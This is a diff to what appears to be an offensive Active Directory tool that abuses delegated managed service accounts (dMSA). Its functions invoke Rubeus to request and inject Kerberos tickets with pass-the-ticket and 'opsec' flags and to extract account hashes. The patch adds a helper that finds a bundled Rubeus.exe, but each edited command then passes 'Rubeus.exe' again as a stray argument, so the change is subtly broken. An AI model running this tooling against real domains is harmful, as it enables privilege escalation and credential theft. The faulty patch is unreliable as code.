@@ -6,6 +6,7 @@ from ldap3.core.exceptions import LDAPSocketOpenError, LDAPBindError, LDAPStartT
 import ssl
 import argparse
 from ldap3.protocol.microsoft import security_descriptor_control
+import importlib.resources
 
 
 def set_dmsa_state_ldap(args, state):
@@ -278,13 +279,13 @@ def run_powershell(cmd: str):
 
 
 def inject_ticket(source_user='', source_user_password='', domain='', domain_controller='', dmsa_account=''):
-    command = ['Rubeus.exe', 'asktgs', f'/targetuser:{dmsa_account}', f'/service:krbtgt/{domain}', '/dmsa',
+    command = [get_rubeus_path(), 'Rubeus.exe', 'asktgs', f'/targetuser:{dmsa_account}', f'/service:krbtgt/{domain}', '/dmsa',
                f'/dc:{domain_controller}', '/ptt', '/outfile:dmsa.kirbi', '/ticket:source.kirbi', '/opsec', '/nowrap']
     result = subprocess.run(command, capture_output=True, text=True)
 
 
 def get_ticket(args, source_user='', source_user_password='', domain='', domain_controller='', dmsa_account=''):
-    command = ['Rubeus.exe', 'asktgt', f'/user:{source_user}', f'/password:{source_user_password}', f'/domain:{domain}',
+    command = [get_rubeus_path(), 'Rubeus.exe', 'asktgt', f'/user:{source_user}', f'/password:{source_user_password}', f'/domain:{domain}',
                f'/dc:{domain_controller}', '/enctype:aes256', '/ptt', '/nowrap', '/outfile:source.kirbi']
     result = subprocess.run(command, capture_output=True, text=True)
 
@@ -420,7 +421,7 @@ def grant_write_privileges(args):
 
 
 def get_hash(args):
-    commands = ["Rubeus.exe", "asktgs", f"/targetuser:{args.dmsa_account_name}$", f"/service:krbtgt/{args.domain}",
+    commands = [get_rubeus_path(), "Rubeus.exe", "asktgs", f"/targetuser:{args.dmsa_account_name}$", f"/service:krbtgt/{args.domain}",
                 "/dmsa", "/opsec", "/ptt", "/ticket:source.kirbi"]
     result = subprocess.run(commands, capture_output=True, text=True)
 
@@ -453,6 +454,14 @@ def print_ending(args, hashes):
 def clean_up(args):
     if os.path.exists("source.kirbi"):
         os.remove("source.kirbi")
+
+
+def get_rubeus_path():
+    try:
+        with importlib.resources.path(__package__ or "__main__", "Rubeus.exe") as p:
+            return str(p)
+    except FileNotFoundError:
+        raise RuntimeError("Rubeus.exe not found. Make sure it's installed with the package.")
 
 
 def main():
